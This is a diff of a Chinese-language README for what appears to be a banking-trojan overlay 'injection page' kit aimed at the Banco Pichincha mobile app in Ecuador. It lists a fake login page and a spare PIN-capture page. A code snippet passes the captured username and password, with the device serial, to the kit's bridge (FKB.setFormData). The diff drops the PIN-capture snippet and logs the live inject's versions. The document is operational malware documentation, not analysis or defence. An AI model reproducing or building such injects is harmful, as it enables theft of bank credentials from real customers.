@@ -1,8 +1,8 @@
 # 厄瓜多尔（EC）注入页
 
-| 品牌 | 包名 | 文件 | 用途 |
+| 品牌 | 包名 | 文件 | 说明 |
 |---|---|---|---|
-| Banca móvil（Banco Pichincha） | com.yellowpepper.pichincha | `com.yellowpepper.pichincha.html` | 登录页（入口，当前启用） |
+| Banca móvil（Banco Pichincha） | com.yellowpepper.pichincha | `com.yellowpepper.pichincha.html` | 登录页（入口，bancaMovil(1) 版） |
 | 同上 | 同上 | `pichincha_pin.html` | PIN 步骤页（备用，未串联） |
 
 ## 协议
@@ -15,12 +15,12 @@ FKB.setFormData(JSON.stringify({
   pkg: pk, sn: sn, template: 'pichincha',
   formData: { username: u, password: p }
 }));
-
-// PIN（备用页）
-FKB.setFormData(JSON.stringify({
-  pkg: pk, sn: sn, template: 'pichincha',
-  formData: { pin: pin }
-}));
 ```
 
-入口仍是登录页；PIN 页已按规范改好放在旁边，需要时把入口指过去或再串联。
+## 版本追溯
+
+```
+fd9d1f5c  bancaMovil(1) ← 当前线上（sha256 c973355f…）
+7d9d4d52  bancaMovil(2)
+f81d8340  串联 PIN 页（已还原）
+```
